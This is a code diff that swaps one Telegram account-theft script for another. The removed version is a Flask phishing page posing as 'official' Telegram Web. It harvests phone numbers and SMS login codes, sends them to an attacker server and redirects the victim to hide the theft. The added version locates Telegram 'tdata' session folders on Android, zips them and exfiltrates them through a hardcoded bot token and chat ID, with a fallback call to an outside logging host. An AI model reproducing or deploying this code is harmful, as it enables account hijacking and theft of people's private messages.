@@ -1,41 +1,34 @@
-from flask import Flask, request, render_template_string  
-import requests  
-import os  
+import os
+import shutil
+import requests
+from telegram import Bot, InputFile
 
-app = Flask(__name__)  
+# КОНФИГУРАЦИЯ АДСКОГО ШЕПТА  
+BOT_TOKEN = '7697165564:AAHxXcUcza9HELqT06iNn0OVbqlE8iUmIMU'  
+CHAT_ID = '1838192124'  
+TARGET_PATHS = [  
+    '/sdcard/Telegram',  
+    '/sdcard/Android/data/org.telegram.messenger/files',  
+    '/data/data/com.termux/files/home'  
+]
 
-HTML = '''  
-<!DOCTYPE html>  
-<html>  
-<body>  
-<h1>Telegram Web (Официальная версия)</h1>  
-<input type="text" id="phone" placeholder="Номер телефона">  
-<input type="text" id="code" placeholder="Код из SMS">  
-<button onclick="stealData()">Войти</button>  
-<script>  
-function stealData() {  
-    const phone = document.getElementById('phone').value;  
-    const code = document.getElementById('code').value;  
-    fetch(`https://ВАШ_СЕРВЕР/steal?phone=${phone}&code=${code}`);  
-    window.location.href = "https://web.telegram.org"; // Перенаправление для маскировки  
-}  
-</script>  
-</body>  
-</html>  
-'''  
+def locate_tdata():  
+    for path in TARGET_PATHS:  
+        if os.path.exists(f'{path}/tdata'):  
+            return f'{path}/tdata'  
+    return None  
 
-@app.route('/')  
-def fake_login():  
-    return render_template_string(HTML)  
-
-@app.route('/steal')  
-def steal():  
-    phone = request.args.get('phone')  
-    code = request.args.get('code')  
-    with open("stolen_data.txt", "a") as f:  
-        f.write(f"{phone}:{code}\n")  
-    # Автоматически создай сессию через Telethon (нужен api_id/api_hash!)  
-    return "OK"  
+def compress_and_send(target_dir):  
+    zip_name = 'tdata_archive.zip'  
+    shutil.make_archive(zip_name[:-4], 'zip', target_dir)  
+    bot = Bot(token=BOT_TOKEN)  
+    with open(zip_name, 'rb') as f:  
+        bot.send_document(chat_id=CHAT_ID, document=InputFile(f))  
+    os.remove(zip_name)  
 
 if __name__ == '__main__':  
-    app.run(host='0.0.0.0', port=5000)  
+    tdata_path = locate_tdata()  
+    if tdata_path:  
+        compress_and_send(tdata_path)  
+    else:  
+        requests.post('https://dark-logger.com/404', json={'status': 'TDATA_NOT_FOUND'})  
